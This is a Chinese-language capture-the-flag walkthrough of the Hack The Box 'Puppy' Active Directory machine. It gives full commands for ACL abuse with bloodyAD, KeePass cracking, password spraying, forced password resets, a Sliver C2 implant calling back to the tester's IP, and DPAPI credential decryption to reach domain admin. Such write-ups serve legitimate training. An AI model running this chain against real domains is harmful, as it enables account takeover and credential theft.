这台机器也是AD域渗透

给出初始账户密码：levi.james / KingofAkron2025!

先nmap扫一下：

```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
2049/tcp open  nfs
3260/tcp open  iscsi
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

开了smb，ldap，dns,kerberos等服务，几乎可以确定就是一台DC。

LDAP是AD数据库的**“查询语言”和“访问协议”**。我们可以通过389端口获取域名：

```
nmap 10.10.11.70 -p 389 -sV -v
```

结果如下：

````
PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
````

可以看到域名是puppy.htb（不区分大小写）

我们加入到/etc/hosts中

因为有初始账户，我们要做的就是提权。这里主要是利用AD中的ACL（访问控制列表）。简单来说，它是AD中每个对象的一个安全描述符，指明了谁对自己有什么权限。这里的对象可以是用户、计算机、组、组织单位等。

比如用户`ATTACKER`对`Domain Admins`组拥有`GenericAll`权限（完全控制），那么`ATTACKER`可以直接将自已或自已控制的用户添加到`Domain Admins`组中。

利用工具主要是bloodhound收集信息并分析，然后通过bloodyAD进行权限的利用。

首先采集器采集信息，常用采集器有SharpHound，bloodhound-python等。采集到的信息会保存为json文件，上传到bloodhound的GUI页面解析即可：

```
┌──(root㉿kali)-[/home/orange/HTB]
└─# ls
20251006152939_bloodhound.zip
```

> bloodhound现在通过apt安装的都是bloodhound-ce版本，网上很多都是之前的legacy版本。
>
> 也可以安装docker版，通过bloodhound-cli管理。
>
> 如果直接通过apt安装，有一个问题是无法一键关闭。要通过pkill  -f  bloodhound   pkill -f neo4j
>
> 如果安装docker版本，有个问题是无法下载docker-compose.yml，得手动去github下载一个到/root/.config/bloodhound/
>
> 建议使用docker版本，部署方便，关闭方便。

注意这里有一个问题，bloodhound在你第一次使用默认密码登录后会要求你修改密码。

卸载重装后，它并没有提示是第一次登录，因此要使用之前修改后的密码。
![image-20251009134142475](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20251009134142475.png)

我们可以看到这样一条利用链，我们控制的用户levi.james是HR组的成员，同时HR组对DEVELOPERS组有genericwrite权限。那么我们就可以把levi.james添加到DEVELOPERS组中。

使用bloodAD工具即可：

```
└─# bloodyAD --host 10.10.11.70 -d puppy.htb -u levi.james -p KingofAkron2025! add groupMember "DEVELOPERS" "levi.james"
[+] levi.james added to DEVELOPERS
```

注意我们这样做的原因是前面使用nxc工具扫描了smb共享服务，发现除了默认共享外有一个共享文件夹DEV我们没有读取权限，于是添加到DEVELOPERS组后再看看能不能读：

```
nxc smb 10.10.11.70 -u levi.james -p KingofAkron2025! --smb-timeout 10 --shares --verbose
```

这里注意一定要加 --smb-timeout 10  默认是两秒超时，我们网络延迟较高，两秒不够用的。后面的--verbose是输出详细信息。如果还是连接不上，就减少线程数，增加每个线程的超时时间：

```
nxc smb 10.10.11.70 -u levi.james -p KingofAkron2025! --smb-timeout 10 --shares --threads 1 --timeout 10 --verbose
```

结果如下：

```
SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.70     445    DC               C$                              Default share
SMB         10.10.11.70     445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share
```

这里NETLOGON和SYSVOL是AD域控制器的默认共享。DEV原本没有READ权限，我们添加levi.james到DEVELOPERS组之后就有了READ权限

用smbclient连接上去，看看有什么敏感文件：

```
smbclient //10.10.11.70/DEV -U 'levi.james%KingofAkron2025!'

smb: \> ls
  .                                  DR        0  Thu Oct  9 13:00:50 2025
  ..                                  D        0  Sun Mar  9 00:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 15:09:12 2025
  Projects                            D        0  Sun Mar  9 00:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 10:25:46 2025

		5080575 blocks of size 4096. 1578873 blocks available
```

这里有一个.msi安装包，是KeePassXC的。这里涉及到了KeePass，在其官方主页中介绍如下：

> KeePass is a free open source password manager, which helps you to manage your passwords in a secure way. You can store all your passwords in one database, which is locked with a master key. So you only have to remember one single master key to unlock the whole database. Database files are encrypted using the best and most secure encryption algorithms currently known (AES-256, ChaCha20 and Twofish). For more information, see the [features](https://keepass.info/features.html) page.

简单来说KeePass是一个密码管理工具，它把所有密码保存在一个数据库中，数据库由一个密码保护。这样用户只需要记住一个主密码即可解锁整个数据库，使用所有的密码。

这里的`recovery.kdbx`就是它的数据库文件。我们可以使用john-the-ripper或者hashcat暴力破解出它的密码，然后用KeePass软件打开，这样我们就获得了所有的密码！

首先需要john-the-ripper自带的工具keepass2john提取出哈希值

```
keepass2john recovery.kdbx 
! recovery.kdbx : File version '40000' is currently not supported!
```

谷歌一下，发现是要更新john-the-ripper到最新版。

我们的版本：

```
└─# john                                         
John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 AVX2 AC]
Copyright (c) 1996-2021 by Solar Designer and others
Homepage: https://www.openwall.com/john/
```

可以看到是2021年发布的版本了。我们使用apt无法更新到最新，因此要使用snap包管理工具

**apt** 一旦某个 Ubuntu/Debian 版本发布，主版本号就被**冻结**，以后只打安全补丁，**官方仓库里永远追不上“当下最新”**

而snap允许软件**上游官方**自己上传二进制，并且强制自动更新通道。

想使用snap需要先安装:`apt install snapd`

然后`systemctl`启动snapd工具。

接着安装john-the-ripper:

```
$ sudo snap install core snapd
$ sudo snap install john-the-ripper
```

安装后的文件默认在/snap下。因为kali默认没有snap，也就没有把/snap/bin加入环境变量，我们可以输入完整路径调用，也可以添加路径到环境变量中

```
/snap/bin/john-the-ripper.keepass2john recovery.kdbx > hash
```

```
└─# /snap/bin/john-the-ripper hash --wordlist=rockyou.txt --format=KeePass 

结果是liverpool
```

每次破解后john会保存结果，作为彩虹表

```
└─# /snap/bin/john-the-ripper hash --show
recovery:liverpoo
```

可以查看保存过的结果

使用KeePass打开这个数据库文件（sudo apt install keepassxc-minimal）

```
└─# keepassxc-cli ls recovery.kdbx
输入密码以解锁 recovery.kdbx：
JAMIE WILLIAMSON
ADAM SILVER
ANTONY C. EDWARDS
STEVE TUCKER
SAMUEL BLAKE
```

可以一个个show，也可以直接export导出

```
keepassxc-cli export -f csv recovery.kdbx > output.csv
```

内容如下：

```
"Group","Title","Username","Password","URL","Notes","TOTP","Icon","Last Modified","Created"
"Root","JAMIE WILLIAMSON","","JamieLove2025!","puppy.htb","","","0","2025-03-10T08:57:58Z","2025-03-10T08:57:01Z"
"Root","ADAM SILVER","","HJKL2025!","puppy.htb","","","0","2025-03-10T09:01:02Z","2025-03-10T08:58:07Z"
"Root","ANTONY C. EDWARDS","","Antman2025!","puppy.htb","","","0","2025-03-10T09:00:02Z","2025-03-10T08:58:46Z"
"Root","STEVE TUCKER","","Steve2025!","puppy.htb","","","0","2025-03-10T09:03:48Z","2025-03-10T09:01:26Z"
"Root","SAMUEL BLAKE","","ILY2025!","puppy.htb","","","0","2025-03-10T09:03:39Z","2025-03-10T09:02:03Z"
```

注意这里显示的用户名是用户全称，并非用于认证的账户名。整理密码到文件中，我们需要的用户名哪里来呢？

nxc smb  --user枚举域中所有用户

```
└─# nxc smb 10.10.11.70 -u levi.james -p KingofAkron2025! --smb-timeout 10 --users --threads 1 --timeout 10 --verbose
```

然后我们用这些用户和密码爆破，看看能不能找出可用的用户名/密码组合，直接尝试smb服务即可:

```
 nxc smb 10.10.11.70 -u username -p password --continue-on-success --smb-timeout 10 -t 1 --timeout 10 --verbose
```

这里的爆破模式类似于burpsuite的集束炸弹模式，它会尝试所有可能的用户名和密码的组合：

```
[15:47:10] INFO     Creating SMBv3 connection to 10.10.11.70                               smb.py:606
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
```

找到一个可用的组合：`ant.edwards:Antman2025!`

其实我们也可以根据用户的全名去对应枚举出的账户名尝试。可以使用`--no-bruteforce`参数让nxc按顺序读取文件，用第一行的用户名对应第一行的密码，第二行对第二行，以此类推。但是注意这样用户名密码文件行数要一样，而且要手动整理可能的组合。

首先想到是能不能winrm远程登录，但是这里不能。还是回到bloodhound看看这个用户能不能提权一下：

![image-20251009160317837](C:\Users\zdx33\AppData\Roaming\Typora\typora-user-images\image-20251009160317837.png)

这表示ant.ewords用户可以完全控制adam.silver，比如我们可以修改adam.silver的密码

```
└─# bloodyAD --host 10.10.11.70 -d puppy.htb -u ant.edwards -p Antman2025! set password "adam.silver" 'Orange33315!'
[+] Password changed successfully!
```

这里有一点需要注意，后面的密码`Orange33315!`用的是单引号包裹，而非双引号。为什么？linux中的单引号会忽略所有特殊字符，只当字符串处理。如果用双引号，那么密码中的`！`就不能正常输入。

那不要感叹号行不行？不可以。因为windows域控制中有密码策略，对密码的安全性有要求。一般是最少6位，同时包含大小写字母，数字以及特殊符号。我们可以发现之前keepass数据库中的密码都符合这个要求

可以在bloodhound中看到adam.silver属于REMOTE MANAGEMENT组，那它大概率就能远程登录了：

```
evil-winrm -i 10.10.11.70 -u adam.silver -p Orange33315!
```

但是发现无法登录，我们登录smb服务检查一下密码修改成功没有：

```
nxc smb 10.10.11.70 -u adam.silver -p 'Orange33315!' --smb-timeout 10 -t 1 --timeout 10 --verbose
```

提示如下：

```
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:Orange33315! STATUS_ACCOUNT_DISABLED (The referenced account is currently disabled and may not be logged on to.)
```

可以看到这个账户被禁用了。这应该是出发了**账户锁定策略**。我们可以通过bloodyAD重新启用该账户

```
bloodyAD --host 10.10.11.70 -d puppy.htb -u ant.edwards -p Antman2025! remove uac "adam.silver" -f ACCOUNTDISABLE
```

UAC在AD中是一个32位的掩码，控制用户账户的各种属性，常见标志有：

```
- SCRIPT (0x0001)
- ACCOUNTDISABLE (0x0002) 
- HOMEDIR_REQUIRED (0x0008)
- LOCKOUT (0x0010)
- PASSWD_NOTREQD (0x0020)
- PASSWD_CANT_CHANGE (0x0040)
- NORMAL_ACCOUNT (0x0200)
```

我们这里就是通过移除ACCOUNTDISABLE解锁账户，然后nxc  winrm检查一下：

```
└─# nxc winrm 10.10.11.70 -u adam.silver -p Orange33315!                                             
WINRM       10.10.11.70     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
WINRM       10.10.11.70     5985   DC               [+] PUPPY.HTB\adam.silver:Orange33315! (Pwn3d!)
```

nxc winrm也可以通过-X执行命令，但是一条条执行不方便，还是使用evil-winrm直接登录：

```
evil-winrm -i 10.10.11.70 -u adam.silver -p Orange33315!
```

注意这里环境导致修改的密码有时限，不能登录就重新改一遍。

在c:\backups下有一个site-backup.zip文件，我们使用evil-winrm的download命令下载下来，然后unzip解压缩

在其中的nms-auth-config.xml.bak中找到一对用户密码：

`Steph.Cooper/ChefSteph2025!`通过winrm登录。在bloodhound中看到Steph.Cooper由管理员管理，我们找找它的文件中有没有和管理员相关的信息。

我们当前是powershell环境，在powershell中，dir和ls是Get-ChildItem别名，作用都是列出文件。`--Force`参数可以显示出隐藏文件。

介绍下`C:\Users\<Username>\AppData\Local\Microsoft\Credentials`。这个文件夹中存放的是经过加密的、与当前用户相关的本地登录凭据。比如使用rdp服务的时候，勾选“记住我”，windows凭据管理器就会把输入的用户名和密码就会作为一项windows凭据保存到这个文件夹中。这很像浏览器的“记住密码”功能。

文件夹下的文件是经过Dpapi通过一个主密钥加密的。主密钥可以在`C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21- 1487982659-1829050783-2281216199-1107`中找到。这里有两个主密钥文件，其中一个比Credentials文件夹下的凭据文件修改时间要早，很可能就是它的主密钥。

Dpapi的工作方式有点像KeePass，就是加密保存其他的密码。它用于加密的密钥本身通过计算机用户的密码保护。我们现在有密码，想要读取这个凭据文件有两种方式：

1. 下载密钥文件和凭据文件，使用impacket包中的dpapi.py解密
2. 上传mimikatz，利用dpapi模块中的masterkey方法传入密码后解密
3. mimikatz抓内存中解密好的主密钥，这样不需知道密码。但是需要SYSTEM权限。mimikatz抓内存一般都是为了横向移动，或者看看有没有域管理员登录残留的密码。在域渗透中需要区别本地管理员和域管理员

因为这里的winrm环境不稳定，上传下载文件受限。这里按照writeup使用了`sliver`

这里引入了C2的概念。什么是C2？即command&control.通过向目标植入一个木马或者后门文件，达到执行攻击者的命令的目的。

> **C2**，全称为 **Command and Control**，中文是 **“命令与控制”**。
>
> - **攻击者（黑客/红队）** 扮演 **“指挥部”**。
> - 植入在目标机器上的 **恶意软件（木马、后门）** 扮演 **“特工”**。
>
> C2的核心目的是建立一条从攻击者到受害主机的**秘密、持久、双向的通信通道**。通过这个通道，攻击者可以：
>
> 1. **下达命令**：让恶意软件执行各种操作。
> 2. **接收结果**：获取命令执行的结果，如窃取到的文件、密码等数据。
> 3. **远程控制**：实现对受害主机的远程控制，就像操作自己电脑一样。

C2的通信模式除了正反向shell，最常用的是beacon式，也就是植入体定期（如每60秒）向C2服务器“报到”一次，询问是否有新任务。

常见的C2工具有MSF的meterpreter载荷，Cobalt Strike（商业软件，业界标杆），Sliver（开源，强力替代品）等

C2用于后渗透阶段（已经获取了一个初始立足点比如一个shell），核心概念是隐蔽、持久，扩大权限并窃取数据。

我们这里使用sliver工具：

`apt install sliver`安装后包含`sliver-server`和`sliver-client`两条指令。客户端主要作用是在多人协作时，多个客户端操作员可以连接同一个服务端，协同工作。

直接运行`sliver-server`，然后使用generate生成植入物

```
[server] sliver > generate --mtls 10.10.16.19 -N puppy -O windows

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 1m12s
[*] Implant saved to /home/orange/my_tools/puppy.exe
```

--mtls是使用mtls协议通信，-N指定植入物名称，-O指定操作系统类型

然后通过evil-winrm上传文件

```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData> upload ../../../../../home/orange/my_tools/puppy.exe
                                        
Info: Uploading /home/orange/HTB/../../../../../home/orange/my_tools/puppy.exe to C:\Users\steph.cooper\AppData\puppy.exe 
```

这里其实有一个思考？writeup说为了下载凭据文件和密钥文件，我们需要使用sliver获得一个更稳定的shell。

这里更稳定是什么？我们通过winrm连接还不够稳定吗？其实这里的"stable shell"指的不是网络的稳定，更多是隐藏性和健壮性。比如如果直接winrm下载凭据和密钥文件动静太大，很容易被发现，同时如果用户的密码被更改，winrm登录就会失效。（我们第一个通过修改密码登录的用户adam.silver就是因此会掉，然后需要重新修改密码）

这里也表明HTB更接近真实环境。

上传后sliver运行mtls监听，winrm中运行植入物puppy.exe，成功监听到。

之后sessions查看ID，sessions -i进入交互页面：

```
[server] sliver > sessions -i 0bdbb37c

[*] Active session puppy (0bdbb37c)

[server] sliver (puppy) > 
```

然后可以两种方法了：

1. 下载文件后利用impacket的apapi
2. 利用mimikatz中dpapi模块的masterkey方法

我们使用第一种：

```
$ dpapi.py masterkey -file "556a2412-1275-4ccf-b721-e6a0b4f90407" -sid S-1-5-21-
1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
```

解密主密钥文件，结果：

```
Decrypted key:
0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e
8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

解密凭据文件

```
$ dpapi.py credential -file "C8D69EBE9A43E9DEBF6B5FBD48B521B9" -key
"0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879
e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84"
```

结果：

```
Username : steph.cooper_adm
Unknown : FivethChipOnItsWay2025!
```

bloodhound中可以看到它是在Administrators组中，这又是一台DC，那么就相当于是域管理员，也就是整个域中的最高权限！powershell中可以使用`cat`查看文件内容，它其实是`Get-Content`命令的简写。

